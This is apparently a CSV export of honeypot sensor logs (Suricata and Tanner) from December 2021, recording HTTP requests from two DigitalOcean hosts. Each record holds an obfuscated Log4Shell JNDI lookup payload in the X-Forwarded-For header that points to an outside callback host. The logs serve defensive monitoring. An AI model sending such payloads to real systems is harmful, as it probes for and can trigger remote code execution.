"@timestamp","@version","_id","_index","_score","_type","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","alert.action","alert.category","alert.gid","alert.rev","alert.severity","alert.signature","alert.signature_id",app,"app_proto","cookies.sess_uuid","dest_ip","dest_port","ecs.version","event_type","fatt_http.clientHeaderHash","fatt_http.clientHeaderOrder","fatt_http.requestFullURI","fatt_http.requestMethod","fatt_http.requestURI","fatt_http.requestVersion","fatt_http.userAgent","fileinfo.filename","fileinfo.gaps","fileinfo.magic","fileinfo.md5","fileinfo.sid","fileinfo.size","fileinfo.state","fileinfo.stored","fileinfo.tx_id","flow.bytes_toclient","flow.bytes_toserver","flow.pkts_toclient","flow.pkts_toserver","flow.start","flow_id","geoip.as_org","geoip.asn","geoip.city_name","geoip.continent_code","geoip.country_code2","geoip.country_code3","geoip.country_name","geoip.dma_code","geoip.ip","geoip.latitude","geoip.location","geoip.longitude","geoip.postal_code","geoip.region_code","geoip.region_name","geoip.timezone",handler,"headers.accept","headers.accept-encoding","headers.connection","headers.cookie","headers.from","headers.host","headers.referer","headers.user-agent","headers.x-forwarded-for","host.name","http.accept_encoding","http.accept_language","http.authorization","http.from","http.hostname","http.http_content_type","http.http_method","http.http_port","http.http_refer","http.http_response_body","http.http_response_body_printable","http.http_user_agent","http.length","http.protocol","http.status","http.url","http.via","http.xff","in_iface","input.type","ip_rep",lang,level,"log.file.path","log.offset",message,"messageBadrequestsyntax($jndi","metadata.flowints.http.anomaly.count","metadata.flowints.tls.anomaly.count",method,mod,msg,params,path,payload,"payload_printable",proto,protocol,query,"raw_sig","response_msg.response.message.detection.name","response_msg.response.message.detection.order","response_msg.response.message.detection.type","response_msg.response.message.detection.version","response_msg.response.message.sess_uuid","response_msg.version",sensorID,"src_ip","src_port",status,stream,subject,"t-pot_hostname","t-pot_ip_ext","t-pot_ip_int",tags,timestamp,"tls.ja3.hash","tls.ja3.string","tls.ja3s.hash","tls.ja3s.string","tls.session_resumed","tls.sni","tls.version","tx_id",type,uuid
"2021-12-15T11:09:44.478Z",1,"riTIvX0B5e7x5EYnsre-","logstash-suricata-2021.12.15",,"_doc","b148a344-a735-455a-962f-049832e5aea5",d732b3b75613,"4ed4dd0a-7d6e-4feb-a94f-8ef7008a16e9",d732b3b75613,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",80,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,1241047123851125,"Digital Ocean, Inc.",14061,"Santa Clara",NA,US,US,"United States",807,"159.89.158.150","37.3417","{""lon"":-121.9753,""lat"":37.3417}","-121.9753",95051,CA,California,"America/Los_Angeles",,,,,,,,,,,d732b3b75613,"gzip, deflate",,,,"172.16.0.42","text/html",GET,,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",10424,"HTTP/1.1",200,"/favicon.ico",,"${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",eth0,log,,,,"/data/suricata/log/eve.json",48363854,"{""timestamp"":""2021-12-15T11:09:44.478078+0000"",""flow_id"":1241047123851125,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""159.89.158.150"",""src_port"":39228,""dest_ip"":""172.16.0.42"",""dest_port"":80,""proto"":""TCP"",""tx_id"":1,""http"":{""hostname"":""172.16.0.42"",""url"":""/favicon.ico"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"",""xff"":""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"",""http_content_type"":""text/html"",""accept_encoding"":""gzip, deflate"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":10424}}",,,,,,,,,,,TCP,,,,,,,,,,,"159.89.158.150",39228,,,,easternfingernail,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T11:09:44.478078+0000",,,,,,,,1,Suricata,
"2021-12-15T11:09:44.478Z",1,"ryTIvX0B5e7x5EYnsre-","logstash-suricata-2021.12.15",,"_doc","b148a344-a735-455a-962f-049832e5aea5",d732b3b75613,"4ed4dd0a-7d6e-4feb-a94f-8ef7008a16e9",d732b3b75613,filebeat,"7.11.1",,,,,,,,,http,,"159.89.158.150",39228,"1.6.0",fileinfo,,,,,,,,"/favicon.ico",false,"HTML document, ASCII text, with very long lines (1488)",51cdc5a4827fd0f112758593f673c970,"[]",10424,CLOSED,false,1,,,,,,1241047123851125,"Digital Ocean, Inc.",14061,Bengaluru,AS,IN,IN,India,,"172.16.0.42","12.9771","{""lon"":77.5871,""lat"":12.9771}","77.5871",560100,KA,Karnataka,"Asia/Kolkata",,,,,,,,,,,d732b3b75613,,,,,"172.16.0.42","text/html",GET,,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",10424,"HTTP/1.1",200,"/favicon.ico",,"${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",eth0,log,,,,"/data/suricata/log/eve.json",48364507,"{""timestamp"":""2021-12-15T11:09:44.478078+0000"",""flow_id"":1241047123851125,""in_iface"":""eth0"",""event_type"":""fileinfo"",""src_ip"":""172.16.0.42"",""src_port"":80,""dest_ip"":""159.89.158.150"",""dest_port"":39228,""proto"":""TCP"",""http"":{""hostname"":""172.16.0.42"",""url"":""/favicon.ico"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"",""xff"":""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"",""http_content_type"":""text/html"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":10424},""app_proto"":""http"",""fileinfo"":{""filename"":""/favicon.ico"",""sid"":[],""magic"":""HTML document, ASCII text, with very long lines (1488)"",""gaps"":false,""state"":""CLOSED"",""md5"":""51cdc5a4827fd0f112758593f673c970"",""stored"":false,""size"":10424,""tx_id"":1}}",,,,,,,,,,,TCP,,,,,,,,,,,"172.16.0.42",80,,,,easternfingernail,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T11:09:44.478078+0000",,,,,,,,,Suricata,
"2021-12-15T11:09:44.218Z",1,"f4fIvX0B6VkG8jKzwoJ-","logstash-tanner-2021.12.15",,"_doc","b148a344-a735-455a-962f-049832e5aea5",d732b3b75613,"4ed4dd0a-7d6e-4feb-a94f-8ef7008a16e9",d732b3b75613,filebeat,"7.11.1",,,,,,,,,,"cf0f5fcf-cad2-4081-978c-6552d4433ed2",,80,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Digital Ocean, Inc.",14061,"Santa Clara",NA,US,US,"United States",807,"159.89.158.150","37.3417","{""lon"":-121.9753,""lat"":37.3417}","-121.9753",95051,CA,California,"America/Los_Angeles",,"*/*","gzip, deflate","keep-alive","sess_uuid=cf0f5fcf-cad2-4081-978c-6552d4433ed2",,"172.16.0.42",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36","${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",d732b3b75613,,,,,,,,,,,,,,,,,,,,log,,,,"/data/tanner/log/tanner_report.json",66293,"{""method"": ""GET"", ""path"": ""/favicon.ico"", ""headers"": {""host"": ""172.16.0.42"", ""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"", ""accept-encoding"": ""gzip, deflate"", ""accept"": ""*/*"", ""connection"": ""keep-alive"", ""x-forwarded-for"": ""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"", ""cookie"": ""sess_uuid=cf0f5fcf-cad2-4081-978c-6552d4433ed2""}, ""uuid"": ""b868d0fa-3d8d-4273-bed1-6395dbfd3241"", ""peer"": {""ip"": ""159.89.158.150"", ""port"": 39228}, ""status"": 200, ""cookies"": {""sess_uuid"": ""cf0f5fcf-cad2-4081-978c-6552d4433ed2""}, ""response_msg"": {""version"": ""0.6.0"", ""response"": {""message"": {""detection"": {""name"": ""index"", ""order"": 1, ""type"": 1, ""version"": ""0.6.0""}, ""sess_uuid"": ""2a803d70-ed05-436b-8096-e0bc0591c208""}}}, ""timestamp"": ""2021-12-15T11:09:44.218118""}",,,,GET,,,,"/favicon.ico",,,,,,,index,1,1,"0.6.0","2a803d70-ed05-436b-8096-e0bc0591c208","0.6.0",,"159.89.158.150",39228,200,,,easternfingernail,"172.16.0.42","172.16.0.42","[""tanner"",""beats_input_codec_plain_applied""]","2021-12-15T11:09:44.218118",,,,,,,,,Tanner,"b868d0fa-3d8d-4273-bed1-6395dbfd3241"
"2021-12-15T11:09:44.186Z",1,x7nIvX0BCXMCNTQLrhOZ,"logstash-suricata-2021.12.15",,"_doc","b148a344-a735-455a-962f-049832e5aea5",d732b3b75613,"4ed4dd0a-7d6e-4feb-a94f-8ef7008a16e9",d732b3b75613,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",80,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,1241047123851125,"Digital Ocean, Inc.",14061,"Santa Clara",NA,US,US,"United States",807,"159.89.158.150","37.3417","{""lon"":-121.9753,""lat"":37.3417}","-121.9753",95051,CA,California,"America/Los_Angeles",,,,,,,,,,,d732b3b75613,"gzip, deflate",,,,"172.16.0.42","text/html",GET,,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",13383,"HTTP/1.1",200,"/",,"${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",eth0,log,,,,"/data/suricata/log/eve.json",48362380,"{""timestamp"":""2021-12-15T11:09:44.186033+0000"",""flow_id"":1241047123851125,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""159.89.158.150"",""src_port"":39228,""dest_ip"":""172.16.0.42"",""dest_port"":80,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""172.16.0.42"",""url"":""/"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"",""xff"":""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"",""http_content_type"":""text/html"",""accept_encoding"":""gzip, deflate"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":13383}}",,,,,,,,,,,TCP,,,,,,,,,,,"159.89.158.150",39228,,,,easternfingernail,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T11:09:44.186033+0000",,,,,,,,0,Suricata,
"2021-12-15T11:09:44.186Z",1,yLnIvX0BCXMCNTQLrhOZ,"logstash-suricata-2021.12.15",,"_doc","b148a344-a735-455a-962f-049832e5aea5",d732b3b75613,"4ed4dd0a-7d6e-4feb-a94f-8ef7008a16e9",d732b3b75613,filebeat,"7.11.1",,,,,,,,,http,,"159.89.158.150",39228,"1.6.0",fileinfo,,,,,,,,"/",false,"HTML document, ASCII text, with very long lines (1673)",c9c65774fd2401c660a14616a73a1890,"[]",13383,CLOSED,false,0,,,,,,1241047123851125,"Digital Ocean, Inc.",14061,Bengaluru,AS,IN,IN,India,,"172.16.0.42","12.9771","{""lon"":77.5871,""lat"":12.9771}","77.5871",560100,KA,Karnataka,"Asia/Kolkata",,,,,,,,,,,d732b3b75613,,,,,"172.16.0.42","text/html",GET,,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",13383,"HTTP/1.1",200,"/",,"${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",eth0,log,,,,"/data/suricata/log/eve.json",48363022,"{""timestamp"":""2021-12-15T11:09:44.186033+0000"",""flow_id"":1241047123851125,""in_iface"":""eth0"",""event_type"":""fileinfo"",""src_ip"":""172.16.0.42"",""src_port"":80,""dest_ip"":""159.89.158.150"",""dest_port"":39228,""proto"":""TCP"",""http"":{""hostname"":""172.16.0.42"",""url"":""/"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"",""xff"":""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"",""http_content_type"":""text/html"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":13383},""app_proto"":""http"",""fileinfo"":{""filename"":""/"",""sid"":[],""magic"":""HTML document, ASCII text, with very long lines (1673)"",""gaps"":false,""state"":""CLOSED"",""md5"":""c9c65774fd2401c660a14616a73a1890"",""stored"":false,""size"":13383,""tx_id"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"172.16.0.42",80,,,,easternfingernail,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T11:09:44.186033+0000",,,,,,,,,Suricata,
"2021-12-15T11:09:43.676Z",1,"fofIvX0B6VkG8jKzwoJ-","logstash-tanner-2021.12.15",,"_doc","b148a344-a735-455a-962f-049832e5aea5",d732b3b75613,"4ed4dd0a-7d6e-4feb-a94f-8ef7008a16e9",d732b3b75613,filebeat,"7.11.1",,,,,,,,,,,,80,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Digital Ocean, Inc.",14061,"Santa Clara",NA,US,US,"United States",807,"159.89.158.150","37.3417","{""lon"":-121.9753,""lat"":37.3417}","-121.9753",95051,CA,California,"America/Los_Angeles",,"*/*","gzip, deflate","keep-alive",,,"172.16.0.42",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36","${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",d732b3b75613,,,,,,,,,,,,,,,,,,,,log,,,,"/data/tanner/log/tanner_report.json",65514,"{""method"": ""GET"", ""path"": ""/"", ""headers"": {""host"": ""172.16.0.42"", ""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"", ""accept-encoding"": ""gzip, deflate"", ""accept"": ""*/*"", ""connection"": ""keep-alive"", ""x-forwarded-for"": ""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}""}, ""uuid"": ""b868d0fa-3d8d-4273-bed1-6395dbfd3241"", ""peer"": {""ip"": ""159.89.158.150"", ""port"": 39228}, ""status"": 200, ""cookies"": {""sess_uuid"": null}, ""response_msg"": {""version"": ""0.6.0"", ""response"": {""message"": {""detection"": {""name"": ""index"", ""order"": 1, ""type"": 1, ""version"": ""0.6.0""}, ""sess_uuid"": ""cf0f5fcf-cad2-4081-978c-6552d4433ed2""}}}, ""timestamp"": ""2021-12-15T11:09:43.676962""}",,,,GET,,,,"/",,,,,,,index,1,1,"0.6.0","cf0f5fcf-cad2-4081-978c-6552d4433ed2","0.6.0",,"159.89.158.150",39228,200,,,easternfingernail,"172.16.0.42","172.16.0.42","[""tanner"",""beats_input_codec_plain_applied""]","2021-12-15T11:09:43.676962",,,,,,,,,Tanner,"b868d0fa-3d8d-4273-bed1-6395dbfd3241"
"2021-12-15T10:56:29.614Z",1,"7CS8vX0B5e7x5EYnizu_","logstash-suricata-2021.12.15",,"_doc","1c82e366-a501-4faa-89c5-9a930a2da558",d5c06704a974,"35064c15-2483-41fb-a866-d82f542f7c36",d5c06704a974,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",80,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,808092893446637,"Digital Ocean, Inc.",14061,Toronto,NA,CA,CA,Canada,,"138.197.167.229","43.6547","{""lon"":-79.3623,""lat"":43.6547}","-79.3623",M5A,ON,Ontario,"America/Toronto",,,,,,,,,,,d5c06704a974,"gzip, deflate",,,,"172.16.0.42","text/html",GET,,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",50195,"HTTP/1.1",404,"/favicon.ico",,"${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",eth0,log,,,,"/data/suricata/log/eve.json",20297548,"{""timestamp"":""2021-12-15T10:56:29.614603+0000"",""flow_id"":808092893446637,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""138.197.167.229"",""src_port"":55306,""dest_ip"":""172.16.0.42"",""dest_port"":80,""proto"":""TCP"",""tx_id"":1,""http"":{""hostname"":""172.16.0.42"",""url"":""/favicon.ico"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"",""xff"":""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"",""http_content_type"":""text/html"",""accept_encoding"":""gzip, deflate"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":404,""length"":50195}}",,,,,,,,,,,TCP,,,,,,,,,,,"138.197.167.229",55306,,,,doubletomato,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T10:56:29.614603+0000",,,,,,,,1,Suricata,
"2021-12-15T10:56:29.614Z",1,"7SS8vX0B5e7x5EYnizu_","logstash-suricata-2021.12.15",,"_doc","1c82e366-a501-4faa-89c5-9a930a2da558",d5c06704a974,"35064c15-2483-41fb-a866-d82f542f7c36",d5c06704a974,filebeat,"7.11.1",,,,,,,,,http,,"138.197.167.229",55306,"1.6.0",fileinfo,,,,,,,,"/favicon.ico",false,"HTML document, Unicode text, UTF-8 text, with very long lines (370)",61aeec46a50c9ea8268014d2e7f0c0ef,"[]",50195,CLOSED,false,1,,,,,,808092893446637,,,,NA,US,US,"United States",,"172.16.0.42","37.751","{""lon"":-97.822,""lat"":37.751}","-97.822",,,,"America/Chicago",,,,,,,,,,,d5c06704a974,,,,,"172.16.0.42","text/html",GET,,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",50195,"HTTP/1.1",404,"/favicon.ico",,"${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",eth0,log,,,,"/data/suricata/log/eve.json",20298199,"{""timestamp"":""2021-12-15T10:56:29.614603+0000"",""flow_id"":808092893446637,""in_iface"":""eth0"",""event_type"":""fileinfo"",""src_ip"":""172.16.0.42"",""src_port"":80,""dest_ip"":""138.197.167.229"",""dest_port"":55306,""proto"":""TCP"",""http"":{""hostname"":""172.16.0.42"",""url"":""/favicon.ico"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"",""xff"":""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"",""http_content_type"":""text/html"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":404,""length"":50195},""app_proto"":""http"",""fileinfo"":{""filename"":""/favicon.ico"",""sid"":[],""magic"":""HTML document, Unicode text, UTF-8 text, with very long lines (370)"",""gaps"":false,""state"":""CLOSED"",""md5"":""61aeec46a50c9ea8268014d2e7f0c0ef"",""stored"":false,""size"":50195,""tx_id"":1}}",,,,,,,,,,,TCP,,,,,,,,,,,"172.16.0.42",80,,,,doubletomato,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-15T10:56:29.614603+0000",,,,,,,,,Suricata,
"2021-12-15T10:56:29.342Z",1,GyS8vX0B5e7x5EYnkDyR,"logstash-tanner-2021.12.15",,"_doc","1c82e366-a501-4faa-89c5-9a930a2da558",d5c06704a974,"35064c15-2483-41fb-a866-d82f542f7c36",d5c06704a974,filebeat,"7.11.1",,,,,,,,,,"cf4f7032-0629-44ac-925d-64c842df1780",,80,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Digital Ocean, Inc.",14061,Toronto,NA,CA,CA,Canada,,"138.197.167.229","43.6547","{""lon"":-79.3623,""lat"":43.6547}","-79.3623",M5A,ON,Ontario,"America/Toronto",,"*/*","gzip, deflate","keep-alive","sess_uuid=cf4f7032-0629-44ac-925d-64c842df1780",,"172.16.0.42",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36","${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",d5c06704a974,,,,,,,,,,,,,,,,,,,,log,,,,"/data/tanner/log/tanner_report.json",95086,"{""method"": ""GET"", ""path"": ""/favicon.ico"", ""headers"": {""host"": ""172.16.0.42"", ""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"", ""accept-encoding"": ""gzip, deflate"", ""accept"": ""*/*"", ""connection"": ""keep-alive"", ""x-forwarded-for"": ""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"", ""cookie"": ""sess_uuid=cf4f7032-0629-44ac-925d-64c842df1780""}, ""uuid"": ""3252b19e-4a60-49f4-9a28-71d62407bac2"", ""peer"": {""ip"": ""138.197.167.229"", ""port"": 55306}, ""status"": 200, ""cookies"": {""sess_uuid"": ""cf4f7032-0629-44ac-925d-64c842df1780""}, ""response_msg"": {""version"": ""0.6.0"", ""response"": {""message"": {""detection"": {""name"": ""index"", ""order"": 1, ""type"": 1, ""version"": ""0.6.0""}, ""sess_uuid"": ""4efde24f-b26d-4f18-a305-65fa20c9832b""}}}, ""timestamp"": ""2021-12-15T10:56:29.342657""}",,,,GET,,,,"/favicon.ico",,,,,,,index,1,1,"0.6.0","4efde24f-b26d-4f18-a305-65fa20c9832b","0.6.0",,"138.197.167.229",55306,200,,,doubletomato,"172.16.0.42","172.16.0.42","[""tanner"",""beats_input_codec_plain_applied""]","2021-12-15T10:56:29.342657",,,,,,,,,Tanner,"3252b19e-4a60-49f4-9a28-71d62407bac2"
"2021-12-15T10:56:28.620Z",1,yIe8vX0B6VkG8jKzhwWs,"logstash-suricata-2021.12.15",,"_doc","1c82e366-a501-4faa-89c5-9a930a2da558",d5c06704a974,"35064c15-2483-41fb-a866-d82f542f7c36",d5c06704a974,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",80,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,808092893446637,"Digital Ocean, Inc.",14061,Toronto,NA,CA,CA,Canada,,"138.197.167.229","43.6547","{""lon"":-79.3623,""lat"":43.6547}","-79.3623",M5A,ON,Ontario,"America/Toronto",,,,,,,,,,,d5c06704a974,"gzip, deflate",,,,"172.16.0.42","text/html",GET,,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",52671,"HTTP/1.1",200,"/",,"${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",eth0,log,,,,"/data/suricata/log/eve.json",20288730,"{""timestamp"":""2021-12-15T10:56:28.620410+0000"",""flow_id"":808092893446637,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""138.197.167.229"",""src_port"":55306,""dest_ip"":""172.16.0.42"",""dest_port"":80,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""172.16.0.42"",""url"":""/"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"",""xff"":""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"",""http_content_type"":""text/html"",""accept_encoding"":""gzip, deflate"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":52671}}",,,,,,,,,,,TCP,,,,,,,,,,,"138.197.167.229",55306,,,,doubletomato,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T10:56:28.620410+0000",,,,,,,,0,Suricata,
"2021-12-15T10:56:28.620Z",1,yYe8vX0B6VkG8jKzhwWs,"logstash-suricata-2021.12.15",,"_doc","1c82e366-a501-4faa-89c5-9a930a2da558",d5c06704a974,"35064c15-2483-41fb-a866-d82f542f7c36",d5c06704a974,filebeat,"7.11.1",,,,,,,,,http,,"138.197.167.229",55306,"1.6.0",fileinfo,,,,,,,,"/",false,"HTML document, Unicode text, UTF-8 text, with very long lines (2102)",bb01c1060ecc1bf4eb4f6a2291787714,"[]",52671,CLOSED,false,0,,,,,,808092893446637,,,,NA,US,US,"United States",,"172.16.0.42","37.751","{""lon"":-97.822,""lat"":37.751}","-97.822",,,,"America/Chicago",,,,,,,,,,,d5c06704a974,,,,,"172.16.0.42","text/html",GET,,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",52671,"HTTP/1.1",200,"/",,"${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}",eth0,log,,,,"/data/suricata/log/eve.json",20289370,"{""timestamp"":""2021-12-15T10:56:28.620410+0000"",""flow_id"":808092893446637,""in_iface"":""eth0"",""event_type"":""fileinfo"",""src_ip"":""172.16.0.42"",""src_port"":80,""dest_ip"":""138.197.167.229"",""dest_port"":55306,""proto"":""TCP"",""http"":{""hostname"":""172.16.0.42"",""url"":""/"",""http_user_agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"",""xff"":""${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"",""http_content_type"":""text/html"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":52671},""app_proto"":""http"",""fileinfo"":{""filename"":""/"",""sid"":[],""magic"":""HTML document, Unicode text, UTF-8 text, with very long lines (2102)"",""gaps"":false,""state"":""CLOSED"",""md5"":""bb01c1060ecc1bf4eb4f6a2291787714"",""stored"":false,""size"":52671,""tx_id"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"172.16.0.42",80,,,,doubletomato,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-15T10:56:28.620410+0000",,,,,,,,,Suricata,
